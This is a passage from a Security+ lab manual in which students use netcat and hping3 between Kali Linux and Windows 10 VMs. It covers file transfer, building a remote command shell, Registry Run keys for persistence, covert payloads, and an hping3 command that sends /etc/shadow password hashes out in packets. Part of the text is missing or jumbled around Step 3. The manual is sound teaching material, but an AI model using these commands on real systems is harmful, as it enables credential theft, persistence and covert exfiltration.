
- b. On the Kali Linux VM, create a text file, put some text in the file, and then save it as bob.txt and close the file.

- c. On the Kali Linux VM, from the same directory you’ve been in, execute the following command (with the IP address of the Windows 10 VM):

  ```
  nc -w 1 192.168.1.107 55555 < bob.txt
  ```

  Send the contents of the bob.txt file, using the input redirection character (`<`), through port 55555 of the machine with an IP address of 192.168.1.107 (the Windows 10 VM).

  The following is from the nc man page (https://linux.die.net/man/1/nc):

  - `-w timeout`  
    If a connection and stdin are idle for more than timeout seconds, then the connection is silently closed. The `-w` flag has no effect on the `-l` option, i.e. nc will listen forever for a connection, with or without the `-w` flag. The default is no timeout.

  Notice that the name of the source file and the file created on the destination machine do not have to match.

  If you are not returned to a prompt, kill the connection with CTRL-C from either side.

- d. On the Windows 10 VM, type `notepad alice.txt` to see the contents of the source’s bob.txt file in the target’s alice.txt file in Notepad. Then close Notepad.

- e. Now reverse roles by making the Kali Linux VM the netcat server and the Windows 10 machine the netcat client.

3a–3e

### Step 3 Create shells with netcat/ncat.

- a. On the Windows 10 VM, type the following command, as shown in Figure 16-26:

Linux!

- c. Any Windows command you type will now be sent to the victim machine and executed on that machine. Try these:

  ```
  ipconfig /all
  arp -a
  route print
  ```

- d. You can even sniff all packets in Wireshark containing all commands and their corresponding output. Filter by `icmp` in Wireshark on the Windows 10 VM.

  From the Windows command prompt on the Kali Linux VM, enter the following:

  ```
  ping 8.8.8.8
  ```

  Now you’re actually sending a ping from the Windows 10 VM via the Kali Linux VM. The replies will go to the Windows 10 VM!

  This ability of sending and receiving can be used for many malicious purposes, including making the victim machine go to systems that will deliver malware and making it appear that a victim machine is actually causing an attack through false attribution.

  Press CTRL-C to break out of the cmd.exe shell in Kali Linux.

This ncat shell creation (shown in Figure 16-26) can even be made persistent by adding it to the victim machine’s Registry in one of the following locations:

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`

- e. Now it’s time to reverse roles and use Bash from the Kali Linux VM.

In this lab exercise, you’ll use hping3 in multiple ways, which can be for good or bad. At the end of this lab exercise, you’ll be able to:

- Craft and send packets containing various protocols with hping3
- Probe a machine using hping3, which has advantages to the traditional ICMP ping
- Encapsulate a secret payload to infiltrate or exfiltrate data
- Analyze and interpret the results in Wireshark

## Lab Materials and Setup

The materials you need for this lab are:

- The *Principles of Computer Security: CompTIA Security+ and Beyond* textbook
- The Kali Linux VM you created in Chapter 1
- The Windows 10 VM you created in Chapter 1
- A web browser with an Internet connection

## Let’s Do This!

On the Windows 10 VM, turn off Windows Defender Firewall.

On the Windows 10 VM, start sniffing in Wireshark with a display filter of **ip.addr==** followed by the IP address of the Kali Linux VM. Locate and analyze the related traffic.

Press ENTER after each command.

1a–1e

### Step 1 Send traffic with hping3 with customized payloads, including the contents of the /etc/shadow file.

- a. In Kali Linux, type `man hping3` to see information about this tool.

- b. Type the following command to use hping3 to send one packet with defaults:

  ```
  sudo hping3 -c 1 192.168.1.108
  ```

  (Substitute the IP address of the Windows 10 VM.)

  The following is from the hping3 man page (https://linux.die.net/man/8/hping3):

  `-c --count count`

  Stop after sending (and receiving) count response packets. After the last packet was sent, hping3 waits `COUNTREACHED_TIMEOUT` seconds for target host replies. You are able to tune `COUNTREACHED_TIMEOUT` by editing `hping3.h`.

  By default, hping3 uses TCP with a random source port number and a destination port number of 0, which is guaranteed not to be open on the destination. Although port 0 is defined as an invalid port number, traffic can be sent to and received from port 0. As an added bonus, a TCP segment sent to port 0 most likely won’t show up in a log file, so the chances of remaining stealthy are even better.

- c. Type the following command to use hping3 with a customized payload:

  ```
  sudo hping3 -c 1 192.168.1.108 -e "CompTIA Security+"
  ```

  (Substitute the IP address of the Windows 10 VM.)

  See Figure 16-30 for what the output should look like, and see Figure 16-31 for what you should see in Wireshark.

  ![](img/6e921d997751f0a0f87e5170ac9657a1_596_0.png)

**FIGURE 16-30** hping3 output

![](img/6e921d997751f0a0f87e5170ac9657a1_597_0.png)

**FIGURE 16-31** The message sent with hping3, CompTIA Security+

The following is from the hping3 man page:

`-e --sign signature`

Fill first *signature length* bytes of data with *signature*. If the *signature length* is bigger than data size an error message will be displayed. If you don’t specify the data size, hping3 will use the signature size as data size. This option can be used safely with the `--file filename` option; the remainder of the data space will be filled using *filename*.

Now you can encapsulate your own payload. A great usage of this is covert communication between an attacker and a piece of malware on a victim system. The attacker could give commands to the malware with this method, and the commands would simply blend in with normal TCP traffic, and then be subsequently read and executed by the malware.

- d. Creating and sending data is one thing; exfiltrating data is something else.

The following is from the hping3 man page:

`-d --data data size`

Set packet body size. Warning: using `--data 40`, hping3 will not generate 0-byte packets but protocol_header + 40 bytes. hping3 will display packet size information as the first line of output, like this:

**HPING www.yahoo.com (ppp0 204.71.200.67): NO FLAGS are set, 40 headers + 40 data bytes**

`-E --file filename`

Use *filename* contents to fill the packet’s data.

Enter

```
ls -l /etc/shadow
```

to see how big the /etc/shadow file is with the password hashes.

### Cross-Reference

You performed lab exercises with the /etc/shadow file in Chapter 5 and Chapter 11. You performed lab exercises with `ls -l` in Chapter 2.

Here’s the output I got:

```
-rw-r----- 1 root shadow 3592 Jul 20 17:04 /etc/shadow
```

The number before the timestamp is the file size in bytes. In my case, it’s 3592 bytes.

- e. Type the following command to specify an appropriate payload size of the /etc/shadow file to steal the password hashes:

  ```
  sudo hping3 -c 1 192.168.1.108 -d 3592 -E /etc/shadow
  ```

  (Substitute the IP address of the Windows 10 VM and substitute the size of your /etc/shadow file.)

  You’ll notice in Wireshark, on the Windows 10 VM, that the packet gets fragmented. Examine the payloads and find the parts of the /etc/shadow file in Wireshark.

2a–2h

### Step 2 Send traffic with hping3 with customized payloads of multiple protocols.

- a. Type the following command to send UDP, instead of the default TCP, with a customized payload:

  ```
  sudo hping3 -c 1 192.168.1.108 -e "FLCC" -2
  ```

  (Substitute the IP address of the Windows 10 VM.)

  The `-2` option specifies UDP. Port 0 is used once again, as it was when TCP was the Layer 4 protocol.

  Find “FLCC” in Wireshark.

- b. Type the following command to send ICMP, instead of the default TCP, with a customized payload:

  ```
  sudo hping3 -c 1 192.168.1.108 -e "RIT" -1
  ```

  (Substitute the IP address of the Windows 10 VM.)

  The `-1` option specifies ICMP. Since ICMP is a Layer 3 protocol, and ports exist at Layer 4, an ICMP Echo Request (Type 8) is sent instead of a TCP segment or UDP datagram with a destination port of 0.

  Using ICMP with hping3 is advantageous compared to the venerable ping utility, because you can specify other ICMP payloads, as well as other types and codes, instead of using the defaults chosen by an operating system with the ping utility.

  Find “RIT” in Wireshark.

- c. You’ll notice, in the Packet Details pane (the middle pane) in Wireshark, that the IP header (click the arrow next to “Internet Protocol Version 4” in any packet to see it) contains a field called Protocol that identifies the protocol encapsulated in the IP packet (most commonly ICMP, TCP, and UDP) in a similar way that the Type field of an Ethernet frame (click the arrow next to Ethernet II to see it) identifies what’s inside the Ethernet frame (most commonly ARP or IP). Wireshark will show an Ethernet frame format, even if you’re on Wi-Fi, which uses 802.11 frames.
